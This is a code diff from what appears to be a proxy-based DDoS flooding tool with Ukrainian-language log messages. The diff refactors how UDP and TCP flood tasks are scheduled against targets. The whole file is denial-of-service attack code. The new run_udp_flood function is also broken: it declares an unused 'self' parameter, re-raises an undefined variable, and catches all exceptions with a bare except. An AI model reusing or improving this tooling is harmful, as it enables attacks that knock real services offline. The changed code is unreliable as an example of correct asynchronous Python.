@@ -28,15 +28,13 @@ from src.targets import Target, TargetsLoader
 WINDOWS = sys.platform == "win32"
 WINDOWS_WAKEUP_SECONDS = 0.5
 
-AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]
-
 
 class GeminoCurseTaskSet:
 
     def __init__(
         self,
-        loop,
-        runnables,
+        loop: asyncio.AbstractEventLoop,
+        runnables: List[AsyncTcpFlood],
         initial_capacity: int = 2,
         max_capacity: int = 10_000,
         fork_scale: int = 2,
@@ -103,41 +101,18 @@ class GeminoCurseTaskSet:
             raise e
 
 
-# XXX: this is going to be used for UDP tasks only, maybe it's better
-#      to rename it properly
-class FloodTaskSet:
-
-    def __init__(self, loop: asyncio.AbstractEventLoop, runnable: AsyncFlood, scale: int = 1):
-        self._loop = loop
-        self._runnable = runnable
-        self._scale = scale
-        self._failure_budget = scale * FAILURE_BUDGET_FACTOR
-        self._failure_budget_delay = FAILURE_DELAY_SECONDS
-
-    def _launch_task(self) -> asyncio.Task:
-        return self._loop.create_task(safe_run(self._runnable.run))
-
-    # XXX: reimplement this algorithm for attacks scheduling
-    #      as it consumes too much resources for dead targets while
-    #      being unfairly slow to those cases where we caught problems
-    #      because of proxies
-    async def loop(self) -> None:
+async def run_udp_flood(self, runnable: AsyncUdpFlood) -> None:
+    num_failures = 0
+    while True:
         try:
-            tasks = set(self._launch_task() for _ in range(self._scale))
-            num_failures = 0
-            while tasks:
-                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
-                for f in done:
-                    num_failures += int(not f.result())
-                    if num_failures >= self._failure_budget:
-                        await asyncio.sleep(self._failure_budget_delay)
-                        num_failures = 0
-                    pending.add(self._launch_task())
-                tasks = pending
-        except asyncio.CancelledError as e:
-            for t in tasks:
-                t.cancel()
+            await runnable.run()
+        except asyncio.CancelledError:
             raise e
+        except:
+            num_failures += 1
+            if num_failures >= FAILURE_BUDGET_FACTOR:
+                await asyncio.sleep(FAILURE_DELAY_SECONDS)
+                num_failures = 0
 
 
 async def run_ddos(
@@ -164,7 +139,7 @@ async def run_ddos(
             logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
             exit()
 
-    def prepare_flooder(target: Target, method: str) -> AsyncFlood:
+    def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
         thread_statistics = Stats()
         sig = target.options_repr
         statistics[(target, method, sig)] = thread_statistics
@@ -248,7 +223,7 @@ async def run_ddos(
             tcp_task_group = None
 
         for flooder in udp_flooders:
-            task = loop.create_task(FloodTaskSet(loop, flooder).loop())
+            task = loop.create_task(run_udp_flood(flooder))
             active_flooder_tasks.append(task)
 
     try:
@@ -280,7 +255,7 @@ async def run_ddos(
                     passed > REFRESH_RATE * REFRESH_OVERTIME,
                 )
                 if tcp_task_group is not None:
-                    logger.info(f"Task group size: {len(tcp_task_group)}")
+                    logger.debug(f"Task group size: {len(tcp_task_group)}")
             finally:
                 cycle_start = time.perf_counter()
 
